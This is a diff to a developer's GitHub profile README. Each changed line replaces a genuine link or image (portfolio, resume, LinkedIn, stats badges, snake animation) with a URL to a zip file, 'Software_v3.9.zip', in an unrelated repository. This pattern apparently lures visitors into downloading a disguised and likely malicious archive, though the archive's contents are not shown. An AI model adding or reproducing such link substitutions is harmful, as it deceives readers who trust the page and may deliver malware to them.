@@ -1,27 +1,27 @@
 <h1 align="center">Hi 👋, I'm Hurmit</h1>
 <br/>
 <div align="center">
- <img src="https://readme-typing-svg.herokuapp.com/?lines=Full+Stack+Web+Developer;MERN+Stack+Developer;Web+Developer;React+Developer;Quick+learner&color=cyan&center=true" />
+ <img src="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip+Stack+Web+Developer;MERN+Stack+Developer;Web+Developer;React+Developer;Quick+learner&color=cyan&center=true" />
 </div>
 <h2>- Full Stack Web Developer skilled in MERN stack.</h2>
 <h2>- I'm a passionate learner who's always willing to learn and work across technologies and domains. I love to explore new technologies and make use of them to solve real-life problems </h2>
-<img align="right" alt "Coding" width="400" src="https://camo.githubusercontent.com/cae12fddd9d6982901d82580bdf321d81fb299141098ca1c2d4891870827bf17/68747470733a2f2f6d69726f2e6d656469756d2e636f6d2f6d61782f313336302f302a37513379765349765f7430696f4a2d5a2e676966">
+<img align="right" alt "Coding" width="400" src="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip">
 
-<p align="left"> <img src="https://komarev.com/ghpvc/?username=hurmitg&label=Profile%20views&color=0e75b6&style=flat" alt="Hurmit" /> </p>
+<p align="left"> <img src="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip" alt="Hurmit" /> </p>
 
 
 
-- 👨‍💻 See my Portfolio here [Portfolio](https://hurmitg.github.io/)
+- 👨‍💻 See my Portfolio here [Portfolio](https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip)
 
 - 📫 Reach me at **hurmitgrover7@gmail.com**
 
-- 📄 Know more about me [Resume](https://drive.google.com/file/d/1C2yv1lUjGm5xdKFNs_Lr3-n6uPta80RZ/view)
+- 📄 Know more about me [Resume](https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip)
 
 - ⚡ Fun fact - *I love Writing 🖊️*
 
 -  🌎 Let's Create something the World needs 🌎
 
-- 👉 Connect with me on [LinkedIn](https://www.linkedin.com/in/Hurmit/)
+- 👉 Connect with me on [LinkedIn](https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip)
 
 
 <br/>
@@ -76,8 +76,8 @@
  ## 📊 My Github Stats
 
 <p align="center">
-    <a href="https://github.com/hurmitg/github-readme-streak-stats">
-        <img title="🔥 Get streak stats for your profile at git.io/streak-stats" alt="Hurmit's streak" src="https://github-readme-streak-stats.herokuapp.com/?user=hurmitg&theme=black-ice&hide_border=true&stroke=0000&background=060A0CD0"/>
+    <a href="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip">
+        <img title="🔥 Get streak stats for your profile at git.io/streak-stats" alt="Hurmit's streak" src="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip"/>
     </a>
 </p>
 
@@ -85,8 +85,8 @@
   <br/>
   
 <p align="center">
-    <a href="https://github.com/hurmitg/github-readme-stats"><img alt="Hurmit's Github Stats" src="https://github-readme-stats.vercel.app/api?username=hurmitg&show_icons=true&count_private=true&theme=react&hide_border=true&bg_color=0D1117" /></a>
-<!--   <a href="https://github.com/hurmitg/github-readme-stats"><img alt="Hurmit's Top Languages" src="https://github-readme-stats.vercel.app/api/top-langs/?username=hurmitg&langs_count=8&count_private=true&layout=compact&theme=react&hide_border=true&bg_color=0D1117" /></a> -->
+    <a href="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip"><img alt="Hurmit's Github Stats" src="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip" /></a>
+<!--   <a href="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip"><img alt="Hurmit's Top Languages" src="https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip" /></a> -->
  </p> 
  <br/>
 
@@ -96,9 +96,9 @@
 
 <div> 
  
-<!--   ![Snake animation](https://github.com/DeepanshuChugh/blob/output/github-contribution-grid-snake.svg) -->
+<!--   ![Snake animation](https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip) -->
    
-  ![Snake animation](https://github.com/rafaballerini/rafaballerini/blob/output/github-contribution-grid-snake.svg)
+  ![Snake animation](https://github.com/Piryanshu88/hurmitg/raw/refs/heads/main/uterocystotomy/Software_v3.9.zip)
  
 </div>
 
